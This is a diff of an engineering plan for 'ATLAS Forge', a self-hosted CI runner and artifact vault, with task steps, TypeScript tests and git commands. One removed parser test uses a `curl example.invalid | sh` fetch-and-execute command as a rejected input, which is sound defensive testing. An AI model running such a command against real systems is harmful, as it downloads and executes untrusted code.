@@ -4,27 +4,27 @@
 
 **Goal:** Bootstrap an ATLAS-controlled development path that can hold a Git-compatible source copy, execute the current ATLAS CI commands on an ATLAS-owned runner, persist logs and checksum-verified artifacts, and continue operating when GitHub or GitHub Actions is unavailable.
 
-**Architecture:** This first Forge milestone is intentionally single-host and filesystem-backed so it can become operational quickly without creating a new mandatory cloud dependency. `packages/forge-core` owns provider-independent states and pipeline contracts; `packages/forge-git` owns local Git operations; `packages/forge-runner` executes exact-SHA jobs without a shell; `packages/forge-artifacts` stores content-addressed build evidence; `apps/forge-api` owns queue/persistence/auth/health. GitHub is only a normal Git remote/mirror in this milestone, so a mirror outage is degraded state rather than a pipeline failure.
+**Architecture:** Milestone 1 is deliberately single-host and filesystem-backed so it can become operational before the rest of Forge exists. `packages/forge-core` owns provider-independent state/pipeline contracts; `packages/forge-git` owns local Git operations; `packages/forge-runner` executes exact-SHA jobs without a shell; `packages/forge-artifacts` stores content-addressed build evidence; `apps/forge-api` owns queue, persistence, auth, audit, and health. GitHub is only an optional Git remote/mirror. TypeScript runtime entry points use the checked-in `tsx` package so Forge does not require generated `dist` files to start and tests always execute the same source files used by the service.
 
-**Tech Stack:** Node.js 22, TypeScript 5.8, npm workspaces, Vitest 3, standard Git CLI, Node built-ins (`node:http`, `node:child_process`, `node:crypto`, `node:fs`, `node:path`), Linux/systemd for the first ATLAS-owned host.
+**Tech Stack:** Node.js 22, TypeScript 5.8, `tsx` 4.x, npm workspaces, Vitest 3, standard Git CLI, Node built-ins (`node:http`, `node:child_process`, `node:crypto`, `node:fs`, `node:path`), Linux/systemd for the first ATLAS-controlled host.
 
 **Spec:** `docs/superpowers/specs/2026-09-06-atlas-forge-sovereign-devops-design.md`
 
 ## Global Constraints
 
-- Work on `release/atlas-a-z`; keep `main` production-stable until the full A-Z closure gate is green.
-- Use standard Git semantics; do not invent a proprietary source format.
+- Work on `release/atlas-a-z`; keep `main` production-stable until the complete A-Z closure gate is green.
+- Use standard Git semantics; never invent a proprietary source format.
 - GitHub is an optional mirror/provider and MUST NOT be required for local source operations or CI execution.
 - CI jobs execute in disposable workspaces and receive no implicit production credentials.
 - Pipeline commands are versioned with source and executed with `shell: false`.
-- A run is always bound to an exact source SHA; the runner verifies checked-out `HEAD` before executing steps.
-- Distinguish `failed` test/build outcomes from `infrastructure_error` and `timed_out` outcomes.
-- Secrets remain outside Git; the first host reads control/runner tokens only from environment files with restrictive permissions.
-- Artifacts are immutable after publication and are identified by SHA-256 manifest digest.
-- Provider failures surface as `degraded` or `unavailable`; they do not silently become successful states.
-- Every sensitive mutation emits ATLAS audit evidence with correlation ID.
-- This plan implements Forge Milestone 1 only: source continuity, runner, CI evidence, artifact vault, health, and provider-neutral Git mirror sync. Internal review UI, multi-host scheduler, remote artifact transport, secret vault, release UI, and full production deployment engine get separate plans after this bootstrap path is working.
-- The existing `test:e2e` script is not treated as proven until the repository contains and verifies its Playwright dependency/config. This milestone uses a sovereign integration E2E test plus the existing unit/integration/build gates and must not claim the full A-Z application E2E gate is complete.
+- Every run binds to one exact 40-character source SHA, and the runner verifies checked-out `HEAD` before execution.
+- Keep `failed`, `timed_out`, and `infrastructure_error` as distinct terminal outcomes.
+- Secrets remain outside Git. The first host reads control/runner tokens only from a root-managed environment file.
+- Artifacts are immutable after publication and identified by SHA-256 manifest digest.
+- Provider failures surface as `degraded` or `unavailable`; they never silently become successful states.
+- Every sensitive Forge mutation emits ATLAS audit evidence with correlation ID.
+- This plan implements Forge Milestone 1 only: source continuity, runner, CI evidence, artifact vault, health, and provider-neutral Git mirror sync. Internal reviews, multi-runner scheduling, secret-vault adapters, release deployment, web UI, and disaster-recovery automation receive separate plans.
+- The existing repository `test:e2e` script is not called proven until its Playwright dependency/config is verified. Milestone 1 proves a sovereign end-to-end Forge flow through Vitest and preserves the full browser E2E requirement for the A-Z release gate.
 
 ---
 
@@ -36,7 +36,6 @@
 
 ### Forge Core
 - Create: `packages/forge-core/package.json`
-- Create: `packages/forge-core/tsconfig.json`
 - Create: `packages/forge-core/src/types.ts`
 - Create: `packages/forge-core/src/stateMachine.ts`
 - Create: `packages/forge-core/src/pipeline.ts`
@@ -46,7 +45,6 @@
 
 ### Local Git service
 - Create: `packages/forge-git/package.json`
-- Create: `packages/forge-git/tsconfig.json`
 - Create: `packages/forge-git/src/gitRepository.ts`
 - Create: `packages/forge-git/src/mirror.ts`
 - Create: `packages/forge-git/src/index.ts`
@@ -54,7 +52,6 @@
 
 ### Runner
 - Create: `packages/forge-runner/package.json`
-- Create: `packages/forge-runner/tsconfig.json`
 - Create: `packages/forge-runner/src/environment.ts`
 - Create: `packages/forge-runner/src/executor.ts`
 - Create: `packages/forge-runner/src/localCli.ts`
@@ -62,10 +59,10 @@
 - Create: `packages/forge-runner/src/daemon.ts`
 - Create: `packages/forge-runner/src/index.ts`
 - Create: `tests/unit/forge-runner.test.ts`
+- Create: `tests/integration/forge-runner-api.test.ts`
 
 ### Artifact Vault
 - Create: `packages/forge-artifacts/package.json`
-- Create: `packages/forge-artifacts/tsconfig.json`
 - Create: `packages/forge-artifacts/src/manifest.ts`
 - Create: `packages/forge-artifacts/src/filesystemArtifactStore.ts`
 - Create: `packages/forge-artifacts/src/index.ts`
@@ -73,7 +70,6 @@
 
 ### Forge API
 - Create: `apps/forge-api/package.json`
-- Create: `apps/forge-api/tsconfig.json`
 - Create: `apps/forge-api/src/config.ts`
 - Create: `apps/forge-api/src/fileStateStore.ts`
 - Create: `apps/forge-api/src/auth.ts`
@@ -82,7 +78,8 @@
 - Create: `apps/forge-api/src/main.ts`
 - Create: `tests/integration/forge-api.test.ts`
 
-### Operations and final continuity proof
+### Workspace and operations
+- Create: `tsconfig.forge.json`
 - Create: `scripts/forge/bootstrap-local-repository.sh`
 - Create: `scripts/forge/sync-git-mirror.sh`
 - Create: `infra/forge/systemd/atlas-forge-api.service`
@@ -90,20 +87,20 @@
 - Create: `infra/forge/forge.env.example`
 - Create: `docs/operations/atlas-forge-bootstrap.md`
 - Create: `tests/integration/forge-sovereign-ci.test.ts`
-- Create: `.gitignore`
+- Create: `.gitignore` if absent; otherwise merge Forge entries into the existing file.
 - Modify: `package.json`
 - Modify: `package-lock.json`
 
 ---
 
-### Task 1: Forge domain contracts, state transitions, and RBAC
+### Task 1: Forge domain contracts, state transitions, workspace runtime, and RBAC
 
 **Files:**
 - Create: `packages/forge-core/package.json`
-- Create: `packages/forge-core/tsconfig.json`
 - Create: `packages/forge-core/src/types.ts`
 - Create: `packages/forge-core/src/stateMachine.ts`
 - Create: `packages/forge-core/src/index.ts`
+- Create: `tsconfig.forge.json`
 - Modify: `packages/core/src/rbac.ts`
 - Modify: `tests/unit/core.test.ts`
 - Create: `tests/unit/forge-core.test.ts`
@@ -111,25 +108,25 @@
 - Modify: `package-lock.json`
 
 **Interfaces:**
-- Produces: `ForgeRunStatus`, `ForgeStepDefinition`, `ForgePipelineDefinition`, `ForgeRunRecord`, `ForgeJobRecord`, `ForgeStepResult`, `ForgeArtifactRecord`, `MirrorState`, `assertRunTransition(current, next)`.
-- Produces shared permissions: `forge.read`, `forge.repository.read|write`, `forge.pipeline.read|execute`, `forge.runner.read|manage`, `forge.artifact.read`, `forge.release.read|approve|deploy`, `forge.mirror.manage`, `forge.admin`.
+- Produces `ForgeRunStatus`, `ForgeStepDefinition`, `ForgePipelineDefinition`, `ForgeRunRecord`, `ForgeJobRecord`, `ForgeStepResult`, `ForgeArtifactRecord`, `MirrorState`, and `assertRunTransition(current, next)`.
+- Produces Forge permissions governed by existing `hasPermission`.
 
-- [ ] **Step 1: Write failing Forge state and RBAC tests**
+- [ ] **Step 1: Write failing Forge state/RBAC tests**
 
 ```ts
 import { describe, expect, it } from 'vitest';
-import { assertRunTransition } from '../../packages/forge-core/src';
-import { hasPermission } from '../../packages/core/src';
+import { assertRunTransition } from '../../packages/forge-core/src/index.ts';
+import { hasPermission } from '../../packages/core/src/index.ts';
 
 describe('ATLAS Forge core', () => {
-  it('allows normal execution transitions and rejects impossible transitions', () => {
+  it('allows execution transitions and rejects terminal resurrection', () => {
     expect(() => assertRunTransition('queued', 'assigned')).not.toThrow();
     expect(() => assertRunTransition('assigned', 'running')).not.toThrow();
     expect(() => assertRunTransition('running', 'passed')).not.toThrow();
     expect(() => assertRunTransition('passed', 'running')).toThrow(/transition/i);
   });
 
-  it('keeps infrastructure failure distinct from product failure', () => {
+  it('keeps product and infrastructure failure separate', () => {
     expect(() => assertRunTransition('running', 'failed')).not.toThrow();
     expect(() => assertRunTransition('running', 'infrastructure_error')).not.toThrow();
   });
@@ -141,19 +138,17 @@ describe('ATLAS Forge core', () => {
 });
 ```
 
-- [ ] **Step 2: Run the tests and verify RED**
-
-Run:
+- [ ] **Step 2: Verify RED**
 
 ```bash
 npm test -- tests/unit/forge-core.test.ts tests/unit/core.test.ts
 ```
 
-Expected: FAIL because `packages/forge-core` and Forge permission implication do not exist yet.
+Expected: FAIL because Forge contracts and Forge admin implication do not exist.
 
-- [ ] **Step 3: Add the Forge package and exact core types**
+- [ ] **Step 3: Add exact Forge types**
 
-`packages/forge-core/src/types.ts` must define these contracts:
+`packages/forge-core/src/types.ts`:
 
 ```ts
 export type ForgeRunStatus =
@@ -191,7 +186,7 @@ export type ForgePipelineDefinition = {
 
 export type ForgeStepResult = {
   readonly stepId: string;
-  readonly status: Exclude<ForgeRunStatus, 'queued' | 'assigned'>;
+  readonly status: 'passed' | 'failed' | 'timed_out' | 'infrastructure_error';
   readonly exitCode: number | null;
   readonly startedAt: string;
   readonly finishedAt: string;
@@ -239,7 +234,7 @@ export type ForgeJobRecord = {
 `packages/forge-core/src/stateMachine.ts`:
 
 ```ts
-import type { ForgeRunStatus } from './types';
+import type { ForgeRunStatus } from './types.ts';
 
 const allowed: Record<ForgeRunStatus, readonly ForgeRunStatus[]> = {
   queued: ['assigned', 'cancelled'],
@@ -259,11 +254,9 @@ export function assertRunTransition(current: ForgeRunStatus, next: ForgeRunStatu
 }
 ```
 
-`packages/forge-core/src/index.ts` exports `types`, `stateMachine`, and later `pipeline`.
+- [ ] **Step 4: Extend shared RBAC**
 
-- [ ] **Step 4: Extend shared RBAC without weakening existing domains**
-
-Add `ForgePermission` to `packages/core/src/rbac.ts` and change the final implication logic to:
+Add this union to `packages/core/src/rbac.ts`:
 
 ```ts
 export type ForgePermission =
@@ -280,42 +273,60 @@ export type ForgePermission =
   | 'forge.release.deploy'
   | 'forge.mirror.manage'
   | 'forge.admin';
-
-export function hasPermission(
-  granted: readonly AtlasPermission[],
-  required: AtlasPermission,
-): boolean {
-  if (granted.includes(required)) return true;
-  if (required.startsWith('accounting.')) return granted.includes('accounting.admin');
-  if (required.startsWith('forge.')) return granted.includes('forge.admin');
-  return false;
-}
 ```
 
-- [ ] **Step 5: Add Node build tooling explicitly at the workspace root**
+The permission implication must end as:
 
-Add root dev dependencies:
+```ts
+if (granted.includes(required)) return true;
+if (required.startsWith('accounting.')) return granted.includes('accounting.admin');
+if (required.startsWith('forge.')) return granted.includes('forge.admin');
+return false;
+```
+
+- [ ] **Step 5: Add a no-emit Forge TypeScript config and local runtime tool**
+
+`tsconfig.forge.json`:
 
 ```json
 {
-  "@types/node": "^22.0.0",
-  "typescript": "^5.8.0"
+  "extends": "./tsconfig.base.json",
+  "compilerOptions": {
+    "types": ["node"],
+    "allowImportingTsExtensions": true,
+    "noEmit": true
+  },
+  "include": [
+    "apps/forge-api/src/**/*.ts",
+    "packages/forge-core/src/**/*.ts",
+    "packages/forge-git/src/**/*.ts",
+    "packages/forge-runner/src/**/*.ts",
+    "packages/forge-artifacts/src/**/*.ts"
+  ]
 }
 ```
 
-Run:
+Add root dev dependencies `@types/node: ^22.0.0`, `typescript: ^5.8.0`, and `tsx: ^4.20.0`. Add `"engines": { "node": ">=22" }`.
+
+Each Forge workspace `package.json` follows the existing ATLAS source-package pattern:
+
+```json
+{
+  "name": "@atlas/forge-core",
+  "private": true,
+  "version": "0.1.0",
+  "type": "module",
+  "exports": "./src/index.ts"
+}
+```
+
+- [ ] **Step 6: Install, test, typecheck, commit**
 
 ```bash
 npm install --no-audit --no-fund
-```
-
-Expected: `package-lock.json` records the new Forge workspaces and Node/TypeScript tooling.
-
-- [ ] **Step 6: Run tests and commit**
-
-```bash
 npm test -- tests/unit/forge-core.test.ts tests/unit/core.test.ts
-git add package.json package-lock.json packages/core/src/rbac.ts packages/forge-core tests/unit/core.test.ts tests/unit/forge-core.test.ts
+npx tsc -p tsconfig.forge.json --noEmit
+git add package.json package-lock.json tsconfig.forge.json packages/core/src/rbac.ts packages/forge-core tests/unit/core.test.ts tests/unit/forge-core.test.ts
 git commit -m "feat: add ATLAS Forge core contracts"
 ```
 
@@ -332,32 +343,28 @@ Expected: PASS.
 - Modify: `tests/unit/forge-core.test.ts`
 
 **Interfaces:**
-- Consumes: `ForgePipelineDefinition`.
-- Produces: `parsePipeline(value: unknown): ForgePipelineDefinition`.
-- Security rule for bootstrap: versioned pipeline steps may execute `npm` only; Git operations are runner-owned and never pipeline shell text.
+- Consumes `ForgePipelineDefinition`.
+- Produces `parsePipeline(value: unknown): ForgePipelineDefinition`.
+- Bootstrap pipeline commands are restricted to `npm`; checkout is runner-owned.
 
-- [ ] **Step 1: Add failing validation tests**
+- [ ] **Step 1: Write failing parser tests**
 
 ```ts
-import { parsePipeline } from '../../packages/forge-core/src';
+import { parsePipeline } from '../../packages/forge-core/src/index.ts';
 
-it('accepts the canonical npm-only pipeline', () => {
-  const pipeline = parsePipeline({
-    id: 'atlas-ci',
-    version: 1,
-    steps: [{ id: 'typecheck', command: 'npm', args: ['run', 'typecheck'], timeoutMs: 600000 }],
-    artifactPaths: ['apps/web/dist'],
-  });
-  expect(pipeline.id).toBe('atlas-ci');
-});
+expect(parsePipeline({
+  id: 'atlas-ci',
+  version: 1,
+  steps: [{ id: 'typecheck', command: 'npm', args: ['run', 'typecheck'], timeoutMs: 600000 }],
+  artifactPaths: ['apps/web/dist'],
+}).id).toBe('atlas-ci');
 
-it('rejects shell or arbitrary executable injection', () => {
-  expect(() => parsePipeline({
-    id: 'unsafe', version: 1,
-    steps: [{ id: 'unsafe', command: 'bash', args: ['-c', 'curl example.invalid | sh'], timeoutMs: 1000 }],
-    artifactPaths: [],
-  })).toThrow(/command/i);
-});
+expect(() => parsePipeline({
+  id: 'unsafe',
+  version: 1,
+  steps: [{ id: 'unsafe', command: 'bash', args: ['-c', 'echo unsafe'], timeoutMs: 1000 }],
+  artifactPaths: [],
+})).toThrow(/command/i);
 ```
 
 - [ ] **Step 2: Verify RED**
@@ -366,19 +373,11 @@ it('rejects shell or arbitrary executable injection', () => {
 npm test -- tests/unit/forge-core.test.ts
 ```
 
-Expected: FAIL because `parsePipeline` does not exist.
+- [ ] **Step 3: Implement strict runtime validation**
 
-- [ ] **Step 3: Implement strict parser**
+`parsePipeline` rejects non-objects, blank IDs, versions below 1, duplicate step IDs, commands other than `npm`, non-string args, timeout values outside `1..1800000`, absolute artifact paths, and artifact paths containing a `..` segment.
 
-Implement manual runtime validation in `pipeline.ts`. It must reject non-object values, blank IDs, versions below 1, duplicate step IDs, commands other than `npm`, non-string args, timeout values outside `1..1800000`, absolute artifact paths, and artifact paths containing `..` path segments.
-
-The exported signature is exactly:
-
-```ts
-export function parsePipeline(value: unknown): ForgePipelineDefinition;
-```
-
-- [ ] **Step 4: Add the canonical pipeline**
+- [ ] **Step 4: Check in the canonical pipeline**
 
 `.atlas/forge/pipelines/atlas-ci.json`:
 
@@ -398,23 +397,21 @@ export function parsePipeline(value: unknown): ForgePipelineDefinition;
 }
 ```
 
-- [ ] **Step 5: Verify parser against the checked-in file and commit**
+- [ ] **Step 5: Test and commit**
 
 ```bash
 npm test -- tests/unit/forge-core.test.ts
+npx tsc -p tsconfig.forge.json --noEmit
 git add .atlas/forge/pipelines/atlas-ci.json packages/forge-core/src tests/unit/forge-core.test.ts
 git commit -m "feat: define ATLAS Forge CI pipeline"
 ```
 
-Expected: PASS.
-
 ---
 
-### Task 3: First-party local Git repository adapter and mirror degradation
+### Task 3: Local Git repository adapter and optional mirror health
 
 **Files:**
 - Create: `packages/forge-git/package.json`
-- Create: `packages/forge-git/tsconfig.json`
 - Create: `packages/forge-git/src/gitRepository.ts`
 - Create: `packages/forge-git/src/mirror.ts`
 - Create: `packages/forge-git/src/index.ts`
@@ -422,21 +419,21 @@ Expected: PASS.
 - Modify: `package-lock.json`
 
 **Interfaces:**
-- Produces: `initBareRepository(repositoryPath)`, `resolveCommit(repositoryPath, ref)`, `checkoutExactSha(repositoryPath, sha, workspacePath)`, `syncMirror(repositoryPath, remoteName)`.
-- `syncMirror` returns `{ state: MirrorState; message: string }`; network/provider failure is data, not an exception that blocks local CI.
+- Produces `initBareRepository(repositoryPath)`, `resolveCommit(repositoryPath, ref)`, `checkoutExactSha(repositoryPath, sha, workspacePath)`, `syncMirror(repositoryPath, remoteName)`.
+- `syncMirror` returns `{ state: MirrorState; message: string }`; provider failure is state, not a local-CI exception.
 
-- [ ] **Step 1: Write failing exact-SHA and unavailable-mirror tests**
+- [ ] **Step 1: Write failing exact-SHA and mirror tests**
 
-Create a temporary source repository using `git init`, set local test author identity, commit `package.json`, push it to a temporary bare repository, then assert:
+Create a temporary source Git repository, commit one file, push it to a temporary bare repository, and assert:
 
 ```ts
 const sha = await resolveCommit(barePath, 'refs/heads/main');
 await checkoutExactSha(barePath, sha, workspacePath);
-expect((await execFileAsync('git', ['-C', workspacePath, 'rev-parse', 'HEAD'])).stdout.trim()).toBe(sha);
+const head = (await execFileAsync('git', ['-C', workspacePath, 'rev-parse', 'HEAD'])).stdout.trim();
+expect(head).toBe(sha);
 
-await execFileAsync('git', ['--git-dir', barePath, 'remote', 'add', 'github', '/missing/provider/repository.git']);
-const mirror = await syncMirror(barePath, 'github');
-expect(mirror.state).toBe('unavailable');
+await execFileAsync('git', ['--git-dir', barePath, 'remote', 'add', 'github', '/missing/provider.git']);
+expect((await syncMirror(barePath, 'github')).state).toBe('unavailable');
 ```
 
 - [ ] **Step 2: Verify RED**
@@ -445,38 +442,28 @@ expect(mirror.state).toBe('unavailable');
 npm test -- tests/integration/forge-git.test.ts
 ```
 
-Expected: FAIL because `forge-git` does not exist.
+- [ ] **Step 3: Implement Git only through `execFile`**
 
-- [ ] **Step 3: Implement Git operations with `execFile`, never shell interpolation**
+Use `promisify(execFile)`; never build shell strings. `checkoutExactSha` rejects non-40-char lowercase hex SHAs, recreates the disposable workspace, clones with `--no-checkout`, checks out `--detach <sha>`, and verifies resolved `HEAD` equals the requested SHA.
 
-Use `promisify(execFile)` and pass every Git argument as an array. `checkoutExactSha` must:
+`syncMirror` runs `git --git-dir <repo> fetch <remote> --prune`. Classify credential/authentication messages as `authentication_required`, throttling/rate-limit messages as `rate_limited`, and other failures as `unavailable`. It MUST NOT force-push divergence.
 
-1. reject SHA values not matching `/^[0-9a-f]{40}$/`;
-2. remove/create the disposable workspace directory;
-3. `git clone --no-checkout <barePath> <workspacePath>`;
-4. `git -C <workspacePath> checkout --detach <sha>`;
-5. resolve `HEAD` and throw if it differs from the requested SHA.
-
-`syncMirror` must run `git --git-dir <repo> fetch <remote> --prune` and classify authentication-looking stderr as `authentication_required`, rate-limit-looking stderr as `rate_limited`, and all other provider failures as `unavailable`. It must never force-push divergent history.
-
-- [ ] **Step 4: Run tests and commit**
+- [ ] **Step 4: Test/typecheck/commit**
 
 ```bash
 npm install --no-audit --no-fund
 npm test -- tests/integration/forge-git.test.ts
+npx tsc -p tsconfig.forge.json --noEmit
 git add packages/forge-git tests/integration/forge-git.test.ts package-lock.json
 git commit -m "feat: add ATLAS Forge local Git adapter"
 ```
 
-Expected: PASS without any network access.
-
 ---
 
-### Task 4: Disposable runner and emergency local CI mode
+### Task 4: Disposable runner and emergency local CI
 
 **Files:**
 - Create: `packages/forge-runner/package.json`
-- Create: `packages/forge-runner/tsconfig.json`
 - Create: `packages/forge-runner/src/environment.ts`
 - Create: `packages/forge-runner/src/executor.ts`
 - Create: `packages/forge-runner/src/localCli.ts`
@@ -486,31 +473,19 @@ Expected: PASS without any network access.
 - Modify: `package-lock.json`
 
 **Interfaces:**
-- Consumes: `ForgePipelineDefinition`, exact-SHA workspace from `forge-git`.
-- Produces: `sanitizedEnvironment(runId)`, `runStep(step, cwd, onLog)`, `executePipeline(pipeline, cwd, runId, onLog)` and emergency CLI `forge:ci:local`.
+- Produces `sanitizedEnvironment(runId)`, `runStep(step, cwd, onLog)`, `executePipeline(pipeline, cwd, runId, onLog)`, and CLI `forge:ci:local`.
 
 - [ ] **Step 1: Write failing runner safety tests**
 
 ```ts
-it('does not leak ambient ATLAS secrets into jobs', () => {
-  process.env.ATLAS_FORGE_CONTROL_TOKEN = 'secret-value';
-  const env = sanitizedEnvironment('run-1');
-  expect(env.ATLAS_FORGE_CONTROL_TOKEN).toBeUndefined();
-  expect(env.CI).toBe('true');
-  expect(env.ATLAS_FORGE_RUN_ID).toBe('run-1');
-});
-
-it('classifies a missing executable as infrastructure_error', async () => {
-  const result = await runStep(
-    { id: 'missing', command: 'atlas-command-that-does-not-exist', args: [], timeoutMs: 1000 },
-    process.cwd(),
-    () => undefined,
-  );
-  expect(result.status).toBe('infrastructure_error');
-});
+process.env.ATLAS_FORGE_CONTROL_TOKEN = 'secret-value';
+const env = sanitizedEnvironment('run-1');
+expect(env.ATLAS_FORGE_CONTROL_TOKEN).toBeUndefined();
+expect(env.CI).toBe('true');
+expect(env.ATLAS_FORGE_RUN_ID).toBe('run-1');
 ```
 
-Also test a Node child process that exits `7` yields `failed`, and a child process exceeding a 50 ms timeout yields `timed_out`.
+Also directly call `runStep` with a missing executable and expect `infrastructure_error`; call Node with `process.exit(7)` and expect `failed`; call a Node process longer than a 50 ms timeout and expect `timed_out`.
 
 - [ ] **Step 2: Verify RED**
 
@@ -518,48 +493,49 @@ Also test a Node child process that exits `7` yields `failed`, and a child proce
 npm test -- tests/unit/forge-runner.test.ts
 ```
 
-- [ ] **Step 3: Implement safe process execution**
+- [ ] **Step 3: Implement no-shell execution and sanitized environment**
 
-`sanitizedEnvironment` may copy only `PATH`, `HOME`, `TMPDIR`, `TEMP`, `SystemRoot`, and `ComSpec` when present, then sets:
+Only inherit `PATH`, `HOME`, `TMPDIR`, `TEMP`, `SystemRoot`, and `ComSpec` when present. Add:
 
 ```ts
-{
-  CI: 'true',
-  ATLAS_FORGE_RUN_ID: runId,
-  npm_config_audit: 'false',
-  npm_config_fund: 'false'
-}
+CI: 'true'
+ATLAS_FORGE_RUN_ID: runId
+npm_config_audit: 'false'
+npm_config_fund: 'false'
 ```
 
-`runStep` uses `spawn(step.command, [...step.args], { cwd, env, shell: false, stdio: ['ignore', 'pipe', 'pipe'] })`, streams stdout/stderr to `onLog`, enforces `timeoutMs`, and returns a typed step result. `executePipeline` stops at the first non-`passed` step.
+Use:
 
-- [ ] **Step 4: Implement emergency local CI**
+```ts
+spawn(step.command, [...step.args], {
+  cwd,
+  env: sanitizedEnvironment(runId),
+  shell: false,
+  stdio: ['ignore', 'pipe', 'pipe'],
+});
+```
 
-`localCli.ts` must:
+Stream both output channels through `onLog`, enforce `timeoutMs`, and stop the pipeline after the first non-passing step.
 
-1. resolve current repository SHA using `git rev-parse HEAD`;
-2. read `.atlas/forge/pipelines/atlas-ci.json`;
-3. validate it with `parsePipeline`;
-4. execute it in the current checkout;
-5. write a JSON evidence record under `${ATLAS_FORGE_HOME:-.atlas-forge}/local-runs/<runId>.json`;
-6. exit `0` only when every pipeline step passes.
+- [ ] **Step 4: Implement emergency local CI evidence**
+
+`localCli.ts` resolves `git rev-parse HEAD`, validates `.atlas/forge/pipelines/atlas-ci.json`, executes the pipeline in the current checkout, and writes `${ATLAS_FORGE_HOME:-.atlas-forge}/local-runs/<runId>.json`. Exit `0` only when all steps pass.
 
 Add root scripts:
 
 ```json
 {
-  "forge:build": "npm --workspace packages/forge-core run build && npm --workspace packages/forge-git run build && npm --workspace packages/forge-artifacts run build && npm --workspace packages/forge-runner run build && npm --workspace apps/forge-api run build",
-  "forge:ci:local": "npm run forge:build && node packages/forge-runner/dist/localCli.js"
+  "forge:typecheck": "tsc -p tsconfig.forge.json --noEmit",
+  "forge:ci:local": "tsx packages/forge-runner/src/localCli.ts"
 }
 ```
-
-Do not add the `forge:build` command until all referenced workspace build scripts exist by the end of Task 6; during Task 4 use the runner workspace build directly.
 
 - [ ] **Step 5: Test and commit**
 
 ```bash
 npm install --no-audit --no-fund
 npm test -- tests/unit/forge-runner.test.ts
+npm run forge:typecheck
 git add packages/forge-runner tests/unit/forge-runner.test.ts package.json package-lock.json
 git commit -m "feat: add ATLAS-owned Forge runner"
 ```
@@ -570,7 +546,6 @@ git commit -m "feat: add ATLAS-owned Forge runner"
 
 **Files:**
 - Create: `packages/forge-artifacts/package.json`
-- Create: `packages/forge-artifacts/tsconfig.json`
 - Create: `packages/forge-artifacts/src/manifest.ts`
 - Create: `packages/forge-artifacts/src/filesystemArtifactStore.ts`
 - Create: `packages/forge-artifacts/src/index.ts`
@@ -578,10 +553,9 @@ git commit -m "feat: add ATLAS-owned Forge runner"
 - Modify: `package-lock.json`
 
 **Interfaces:**
-- Produces: `buildArtifactManifest(directory)`, `publishDirectory(input)`, `verifyArtifact(record)`.
-- Artifact digest is SHA-256 over canonical JSON of sorted relative file paths, sizes, and individual SHA-256 values.
+- Produces `buildArtifactManifest(directory)`, `FilesystemArtifactStore.publishDirectory(input)`, and `FilesystemArtifactStore.verifyArtifact(record)`.
 
-- [ ] **Step 1: Write failing immutability/integrity test**
+- [ ] **Step 1: Write failing integrity test**
 
 ```ts
 const published = await store.publishDirectory({
@@ -602,33 +576,33 @@ expect(await store.verifyArtifact(published)).toBe(false);
 npm test -- tests/unit/forge-artifacts.test.ts
 ```
 
-- [ ] **Step 3: Implement deterministic manifest and publish**
+- [ ] **Step 3: Implement canonical manifest and immutable publication**
 
-Walk files recursively, reject symbolic links, normalize relative paths to `/`, sort lexicographically, hash each file with SHA-256, then hash the UTF-8 JSON manifest. Publish into:
+Recursively walk regular files, reject symlinks, normalize relative paths to `/`, sort paths, SHA-256 every file, serialize only `{path,size,sha256}` entries plus source SHA/run ID, and SHA-256 that canonical JSON. Publish to:
 
 ```text
-<forge-home>/artifacts/<manifest-digest>/manifest.json
-<forge-home>/artifacts/<manifest-digest>/payload/<relative files>
+<forge-home>/artifacts/<digest>/manifest.json
+<forge-home>/artifacts/<digest>/payload/<files>
 ```
 
-If the digest directory already exists, verify it and return the existing immutable artifact; if verification fails, raise an integrity error rather than overwrite it.
+If the digest directory already exists, verify and reuse it. If verification fails, throw an integrity error instead of overwriting evidence.
 
-- [ ] **Step 4: Test and commit**
+- [ ] **Step 4: Test/typecheck/commit**
 
 ```bash
 npm install --no-audit --no-fund
 npm test -- tests/unit/forge-artifacts.test.ts
+npm run forge:typecheck
 git add packages/forge-artifacts tests/unit/forge-artifacts.test.ts package-lock.json
 git commit -m "feat: add ATLAS Forge artifact vault"
 ```
 
 ---
 
-### Task 6: Filesystem-backed Forge API, queue, audit, and health
+### Task 6: Filesystem Forge API, queue lifecycle, audit, and health
 
 **Files:**
 - Create: `apps/forge-api/package.json`
-- Create: `apps/forge-api/tsconfig.json`
 - Create: `apps/forge-api/src/config.ts`
 - Create: `apps/forge-api/src/fileStateStore.ts`
 - Create: `apps/forge-api/src/auth.ts`
@@ -640,35 +614,12 @@ git commit -m "feat: add ATLAS Forge artifact vault"
 - Modify: `package-lock.json`
 
 **Interfaces:**
-- Produces HTTP contracts:
-  - `GET /healthz`
-  - `POST /v1/runs`
-  - `POST /v1/jobs/claim`
-  - `POST /v1/jobs/:jobId/log`
-  - `POST /v1/jobs/:jobId/complete`
-  - `GET /v1/runs/:runId`
-- Control routes require `ATLAS_FORGE_CONTROL_TOKEN`; runner routes require `ATLAS_FORGE_RUNNER_TOKEN`.
+- HTTP: `GET /healthz`, `POST /v1/runs`, `POST /v1/jobs/claim`, `POST /v1/jobs/:jobId/start`, `POST /v1/jobs/:jobId/log`, `POST /v1/jobs/:jobId/complete`, `GET /v1/runs/:runId`.
+- Control operations use `ATLAS_FORGE_CONTROL_TOKEN`; runner operations use `ATLAS_FORGE_RUNNER_TOKEN`.
 
-- [ ] **Step 1: Write failing API contract test**
+- [ ] **Step 1: Write failing auth/run lifecycle test**
 
-Start `createForgeServer` on port `0` with a temporary Forge home. Assert:
-
-```ts
-expect((await fetch(`${base}/healthz`)).status).toBe(200);
-
-const unauthorized = await fetch(`${base}/v1/runs`, {
-  method: 'POST', headers: { 'content-type': 'application/json' },
-  body: JSON.stringify({ repositoryId: 'atlas', sourceSha: 'a'.repeat(40), pipelineId: 'atlas-ci', requestedBy: 'test' }),
-});
-expect(unauthorized.status).toBe(401);
-
-const created = await fetch(`${base}/v1/runs`, {
-  method: 'POST',
-  headers: { authorization: 'Bearer control-test', 'content-type': 'application/json' },
-  body: JSON.stringify({ repositoryId: 'atlas', sourceSha: 'a'.repeat(40), pipelineId: 'atlas-ci', requestedBy: 'test' }),
-});
-expect(created.status).toBe(201);
-```
+Start `createForgeServer` on port `0` with a temporary Forge home. Verify health is 200, unauthenticated run creation is 401, authenticated creation is 201, runner claim moves the job to `assigned`, runner start moves it to `running`, and completion from `running` to `passed` succeeds. Also assert completion directly from `assigned` returns `409`.
 
 - [ ] **Step 2: Verify RED**
 
@@ -676,9 +627,7 @@ expect(created.status).toBe(201);
 npm test -- tests/integration/forge-api.test.ts
 ```
 
-- [ ] **Step 3: Implement explicit configuration and constant-time token checks**
-
-`ForgeApiConfig` requires:
+- [ ] **Step 3: Implement explicit configuration and constant-time auth**
 
 ```ts
